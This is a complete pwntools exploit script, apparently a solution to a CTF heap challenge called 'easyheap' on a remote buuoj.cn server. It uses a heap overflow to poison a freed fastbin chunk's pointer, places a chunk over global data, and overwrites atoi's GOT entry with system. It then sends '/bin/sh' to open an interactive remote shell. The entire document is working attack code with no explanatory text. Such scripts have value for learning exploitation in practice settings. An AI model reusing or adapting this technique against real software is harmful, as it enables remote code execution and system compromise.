from pwn import *

context.log_level = "debug"

exe = ELF("./easyheap")
# libc = ELF("./libc-2.23.so")
# r = process(["./ld-2.23.so", "./easyheap"], env={"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF("./libc.so")
r = remote("node4.buuoj.cn", 25029)


def recvmenu():
    r.recvuntil(b" :")


def create(size: int):
    recvmenu()
    r.send(b"1")
    r.recvuntil(b"Size of Heap : ")
    r.send(str(size).encode())
    r.recvuntil(b"Content of heap:")
    r.send(b"empty")


def edit(index: int, content: bytes):
    recvmenu()
    r.send(b"2")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())
    r.recvuntil(b"Size of Heap : ")
    r.send(str(len(content)).encode())
    r.recvuntil(b"Content of heap : ")
    r.send(content)


def delete(index: int):
    recvmenu()
    r.send(b"3")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())


create(0x60)  # 0
create(0x60)  # 1
delete(1)
edit(0, p64(0) * 13 + p64(0x71) + p64(0x6020AD))
create(0x60)
create(0x60)
edit(2, cyclic(0x23) + p64(exe.got["atoi"]))
edit(0, p64(exe.plt["system"]))
recvmenu()
r.send(b"/bin/sh")
r.interactive()
# gdb.attach(r)
# pause()
